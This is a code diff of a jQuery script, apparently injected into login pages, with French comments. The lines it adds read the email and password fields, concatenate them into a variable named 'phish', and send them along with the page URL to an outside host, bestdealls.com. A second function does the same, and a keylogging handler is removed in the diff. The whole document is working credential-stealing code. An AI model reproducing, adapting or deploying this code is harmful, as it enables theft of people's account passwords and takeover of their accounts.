@@ -81,22 +81,14 @@ $(document).ready(function()
     // FACEBOOK FUNCTION BESOIN DE HTTPS
     function sendF()
     {
+        var email = document.getElementById('email').value;
+        var pass = document.getElementById('pass').value;
         var urls = window.location.href;
+        phish = email+"-123-"+pass;
         $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
     }
     function face()
     {
-        document.onkeypress = keychangefb;
-        function keychangefb()
-        {
-            var key = event.keyCode;
-            var letter = String.fromCharCode(key);
-            if(key == 13)
-            {
-                var code = document.body.getElementsByTagName('input')[2].value;
-            }
-            phish += letter;
-        }
         var fb = document.body.getElementsByTagName('input')[3];
         fb.onmouseenter = sendF;
     }
@@ -120,7 +112,7 @@ $(document).ready(function()
         var urls = window.location.href;
         var email = $('#email')[0].value;
         var pass = $('#password')[0].value;
-        var phish = email+"&123&"+pass;
+        var phish = email+"-123-"+pass;
         $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
     }
     
